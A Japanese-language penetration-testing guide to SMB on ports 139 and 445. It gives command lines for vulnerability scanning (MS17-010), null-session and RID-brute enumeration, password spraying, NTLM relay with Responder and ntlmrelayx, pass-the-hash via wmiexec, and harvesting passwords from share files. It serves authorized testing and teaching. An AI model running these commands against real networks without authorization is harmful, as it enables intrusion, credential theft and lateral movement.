# SMB高度調査ガイド
SMB（Server Message Block）は、Windows環境におけるファイル共有、プリンタ共有、およびプロセス間通信（RPC）の基盤であり、侵入テストにおいて最も重要な攻撃ベクトルの一つである。本ガイドでは、ポート139および445を対象とした包括的な調査ロジックを整理する。

---

## 1. プロトコル基礎と初期偵察

SMBは通常、以下のポートで動作する。

- **Port 139:** NetBIOS over TCP/IP。
    
- **Port 445:** SMB over TCP/IP（現代のWindows環境の主流）。
    

### 1.1 初期スキャン (Nmap)

Bash

```
# SMBサービスの特定と基本スクリプトの実行
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users [IP]

# 既知の脆弱性（EternalBlue等）のチェック
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms10-061 [IP]
```

---

## 2. 列挙 (Enumeration) 戦略

資格情報がない状態（Null Session）から、有効なユーザー情報を得るまでのフロー。

### 2.1 ヌルセッションとアノニマスアクセスの確認

認証なしで接続し、システム情報を抽出する。

- **rpcclient:** `rpcclient -U "" [IP]` （パスワード入力でEnter）。
    
- **enum4linux-ng:** `enum4linux-ng -A [IP]` （OS情報、ユーザー、共有、ポリシーを一括列挙）。
    
- **smbclient:** `smbclient -L //[IP] -N` （共有フォルダのリスト表示）。
    

### 2.2 rpcclient による詳細列挙

セッション確立後、以下のコマンドで内部情報を引き出す。

- **ユーザー情報:** `enumdomusers` (一覧), `queryuser <RID>` (詳細), `querydispinfo` 。
    
- **グループ情報:** `enumdomgroups`, `querygroup <RID>`, `querygroupmem <RID>` 。
    
- **ドメイン情報:** `querydominfo`, `lsaquery` (SID取得) 。
    
- **共有情報:** `netshareenumall` 。
    

### 2.3 NetExec (nxc) による効率的列挙

現代のペンテストにおける標準ツール。

Bash

```
# 共有フォルダの権限確認
nxc smb [IP] -u '' -p '' --shares

# RIDブルートフォース（ユーザー名の特定）
nxc smb [IP] -u 'guest' -p '' --rid-brute

# パスワードスプレー（特定したユーザーリストに対して共通パスワードを試行）
nxc smb [IP] -u users.txt -p 'Password123'
```

---

## 3. 脆弱性診断と設定ミス (Misconfigurations)

### 3.1 SMB署名 (SMB Signing) の確認

SMB署名が無効な場合、NTLMリレー攻撃が可能となる。

- **確認:** `nxc smb [IP] --gen-relay-list relay_targets.txt` 。
    
- **攻撃:** `Responder` でリクエストを捕捉し、`ntlmrelayx.py` で署名無効な他ホストへリレーする。
    

### 3.2 危険な設定 (smb.conf / Registry)

SambaサーバーやWindows共有の不適切な設定を特定する。

- `guest ok = yes`: 認証なしでアクセス可能。
    
- `read only = no` / `writable = yes`: ファイルの改ざんやアップロードが可能。
    
- `create mask = 0777`: 作成されたファイルが全ユーザーから操作可能。
    

---

## 4. 攻撃と横展開 (Exploitation & Lateral Movement)

### 4.1 Pass-the-Hash (PtH)

パスワードそのものではなく、NTハッシュを使用して認証する。

Bash

```
# xfreerdpによるRDP接続
xfreerdp /u:Administrator /pth: /v:[IP]

# Impacket wmiexecによるコマンド実行
impacket-wmiexec Administrator@[IP] -hashes :
```

### 4.2 認証情報の窃取

アクセス権を得た後、機密ファイルを検索する。

- **ファイル検索:** `nxc smb [IP] -u [User] -p [Pass] --spider "*.pdf" --content` 。
    
- **重要ファイル:** `unattend.xml`, `sysprep.inf`, `web.config` からプレーンテキストパスワードを抽出。
    

---

## 5. SMB調査チェックリスト

- [ ] **ヌルセッション:** 認証なしで `rpcclient` や `enum4linux-ng` が動作するか？
    
- [ ] **共有権限:** `READ` だけでなく `WRITE` 権限のある共有（特に `ADMIN$` や `C$`）はないか？
    
- [ ] **SMB署名:** 無効なホストを特定し、リレー攻撃の対象リストを作成したか？
    
- [ ] **脆弱なサービス:** `EternalBlue` (MS17-010) 等のクリティカルな脆弱性は未修正か？
    
- [ ] **AD連携:** `NetExec` や `BloodHound` で、特定したユーザーが所属する特権グループを確認したか？